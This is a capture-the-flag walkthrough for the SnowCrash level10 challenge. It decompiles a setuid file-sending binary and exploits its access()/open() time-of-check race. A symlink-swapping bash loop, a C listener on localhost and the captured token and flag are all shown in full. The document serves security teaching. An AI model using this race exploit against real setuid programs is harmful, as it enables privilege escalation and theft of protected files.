# Level10

## Walkthrough

We list the files in the home directory.

```bash
level10@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
level10@SnowCrash:~$ file level10 
level10: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf7e21fb68568fa57d6317d0535b97d9fca66f841, not stripped
level10@SnowCrash:~$ file token 
token: regular file, no read permission
```

`level10` is owned by **flag10** and has the **setuid** flag.

We run `level10`.

```bash
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token 127.0.0.1
You don't have access to token
```

It looks like the executable is accepting 2 arguments: one file and one host.

We analyze the code of the `level10` executable.

[Link to the decompiled executable](https://dogbolt.org/?id=3195ec07-ba0b-4721-be30-57fc2718e097)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int *v3; // eax
  char *v4; // eax
  const char *v6; // [esp+28h] [ebp-1028h]
  const char *v7; // [esp+2Ch] [ebp-1024h]
  int v8; // [esp+30h] [ebp-1020h]
  int v9; // [esp+34h] [ebp-101Ch]
  size_t v10; // [esp+38h] [ebp-1018h]
  char buf[4096]; // [esp+3Ch] [ebp-1014h] BYREF
  struct sockaddr addr; // [esp+103Ch] [ebp-14h] BYREF
  unsigned int v13; // [esp+104Ch] [ebp-4h]

  v13 = __readgsdword(0x14u);
  if ( argc <= 2 )
  {
    printf("%s file host\n\tsends file to host if you have access to it\n", *argv);
    exit(1);
  }
  v6 = argv[1];
  v7 = argv[2];
  if ( access(v6, 4) )
    return printf("You don't have access to %s\n", v6);
  printf("Connecting to %s:6969 .. ", v7);
  fflush(stdout);
  v8 = socket(2, 1, 0);
  *(_DWORD *)&addr.sa_data[6] = 0;
  *(_DWORD *)&addr.sa_data[10] = 0;
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = inet_addr(v7);
  *(_WORD *)addr.sa_data = htons(0x1B39u);
  if ( connect(v8, &addr, 0x10u) == -1 )
  {
    printf("Unable to connect to host %s\n", v7);
    exit(1);
  }
  if ( write(v8, ".*( )*.\n", 8u) == -1 )
  {
    printf("Unable to write banner to host %s\n", v7);
    exit(1);
  }
  printf("Connected!\nSending file .. ");
  fflush(stdout);
  v9 = open(v6, 0);
  if ( v9 == -1 )
  {
    puts("Damn. Unable to open file");
    exit(1);
  }
  v10 = read(v9, buf, 0x1000u);
  if ( v10 == -1 )
  {
    v3 = __errno_location();
    v4 = strerror(*v3);
    printf("Unable to read from file: %s\n", v4);
    exit(1);
  }
  write(v8, buf, v10);
  return puts("wrote file!");
}
```

We find out that the executable:
- accepts 2 arguments
- checks with `access()` if the file is accesible
- initializes a socket and tries to connect to port 6969 on host specified in argv
- writes a text banner to the connected socket
- opens the file whose path has been passed in argv
- reads the opened file
- writes the content of the file to the connected socket

We read the manpage of `access()` and notice this line:
```
The check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file.
```

With this information, our first idea in order to break the executable is to pass the path to an empty file with the correct permissions for **level10** as first argument, and then create a symbolic link to the `token` file after the call to `access()`.  
It seems to be a well-known exploit called `TOCTOU` (Time of Check to Time of Update), as explained in the manpage of `access()`:
```
Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.
```

Our first attempt is to:
- create a listening TCP socket with **netcat**
- run the executable with **GDB**
- set a breakpoint after `access()`
- update the file
- continue the execution.

With this method, we are able to succesfully pass the first condition (`access()`), but not the second one (`open()`) due to a lack of permissions.  
Unfortunately, **GDB** doesn't seem to work when an executable has a **setuid** flag.

If we cannot use **GDB** and we cannot update the executable to make it sleep for some seconds, our sole solution is to brute force the level by running in a loop the executable and a custom script until the timing of their instructions match our desired output which is:
- creation of an empty file named `token` in `/tmp/level10`
- execution of `access()` in `level10`
- deletion of `token` and creation of symbolic link to `~/token`
- execution of `open()` in `level10`

We create our custom script.

```bash
level10@SnowCrash:~$ mkdir /tmp/level10 && cd /tmp/level10
level10@SnowCrash:/tmp/level10$ vim script
level10@SnowCrash:/tmp/level10$ chmod +x script
```

```bash
while true; do
  touch token
  rm token && ln -s ~/token token
  sleep 0.2
  rm token
done
```

Then we create and run a custom socket server, because `level10` sends a EOF and closes the connection with our netcat server after every execution.

```bash
level10@SnowCrash:/tmp/level10$ vim server.c
level10@SnowCrash:/tmp/level10$ gcc -std=c99 server.c
level10@SnowCrash:/tmp/level10$ ./a.out
```

```c
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define BUFFER_LEN 1024
#define PORT 6969

int main(void) {
	int sock_fd;
	struct sockaddr_in addr;
	int new_fd;
	socklen_t addr_len;

	fd_set master;
	fd_set read_fds;
	int fd_max;

	char buffer[1024];
	int nb_bytes;

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(PORT);
	addr_len = sizeof(addr);
	sock_fd = socket(addr.sin_family, SOCK_STREAM, 0);
	if (sock_fd == -1) {
		printf("error: socket\n");
		return 1;
	}
	if (bind(sock_fd, (struct sockaddr*)&addr, addr_len) == -1) {
		printf("error: bind\n");
		return 1;
	}
	if (listen(sock_fd, 10) == -1) {
		printf("error: listen\n");
		return 1;
	}
	FD_ZERO(&master);
	FD_ZERO(&read_fds);
	FD_SET(sock_fd, &master);
	fd_max = sock_fd;
	while (1) {
		read_fds = master;
		if (select(fd_max + 1, &read_fds, NULL, NULL, NULL) == -1) {
			printf("error: select\n");
			return 1;
		}
		for (int i = 0; i <= fd_max; i++) {
			if (FD_ISSET(i, &read_fds)) {
				if (i == sock_fd) {
					new_fd = accept(sock_fd, NULL, NULL);
					if (new_fd == -1) {
						printf("error: accept\n");
					} else {
						FD_SET(new_fd, &master);
						if (new_fd > fd_max) {
							fd_max = new_fd;
						}
					}
				} else {
					memset(buffer, 0, BUFFER_LEN);
					nb_bytes = recv(i, buffer, BUFFER_LEN - 1, 0);
					if (nb_bytes <= 0) {
						if (nb_bytes == 0) {
							printf("info: socket shutdown\n");
						} else {
							printf("error: recv\n");
						}
						close(i);
						FD_CLR(i, &master);
					} else {
						printf("buffer: %s\n", buffer);
					}
				}
			}
		}
	}
	return 0;
}
```

Finally we start running in custom script and the `level10` executable every 0.x seconds, and wait.

```bash
# in first terminal
level10@SnowCrash:/tmp/level10$ ./script

# in second terminal
level10@SnowCrash:~$ watch -n 0.1 ./level10 /tmp/level10/token 127.0.0.1
```

After a few to several seconds, the token is received by our server and printed on stdout.

```bash
buffer: .*( )*.

info: socket shutdown
buffer: .*( )*.

info: socket shutdown
buffer: .*( )*.

# [...]

info: socket shutdown
buffer: .*( )*.

info: socket shutdown
buffer: .*( )*.

buffer: woupa2yuojeeaaed06riuj63c
```

```bash
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

## Resources

- [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
- [access() Security Hole](https://stackoverflow.com/questions/7925177/access-security-hole)
